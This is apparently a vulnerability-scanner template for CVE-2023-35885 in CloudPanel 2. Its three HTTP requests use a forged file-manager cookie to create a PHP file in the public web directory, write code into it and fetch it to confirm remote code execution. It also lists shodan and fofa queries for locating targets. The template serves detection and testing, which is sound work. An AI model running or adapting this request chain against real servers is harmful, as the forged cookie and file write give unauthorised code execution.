id: CVE-2023-35885

info:
  name: Cloudpanel 2 < 2.3.1 - Remote Code Execution
  author: DhiyaneshDk
  severity: critical
  description: |-
    CloudPanel 2 before 2.3.1 has insecure file-manager cookie authentication.
    shodan: title:"Cloudpanel"
    fofa: title="Cloudpanel"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-35885
    - https://www.datack.my/fallingskies-cloudpanel-0-day/
    - https://github.com/datackmy/FallingSkies-CVE-2023-35885
    - https://www.cloudpanel.io/docs/v2/changelog/
  tags: cve,cve2023,cloudpanel,kev,rce,instrusive
  created: 2023/07/30

set:
  num: randomInt(800000000, 1000000000)
rules:
  r0:
    request:
      method: POST
      path: /file-manager/backend/makefile
      headers:
        Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
      body: id=/htdocs/app/files/public/&name=test.php
    expression: response.status == 200 && response.body.bcontains(b'"value":"test.php"')
  r1:
    request:
      method: POST
      path: /file-manager/backend/text
      headers:
        Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
      body: id=/htdocs/app/files/public/test.php&content=<?php echo md5({{num}});?>
    expression: response.status == 200 && response.body.bcontains(b'"value":"test.php"')
  r2:
    request:
      method: GET
      path: /test.php
    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(num))))
expression: r0() && r1() && r2()
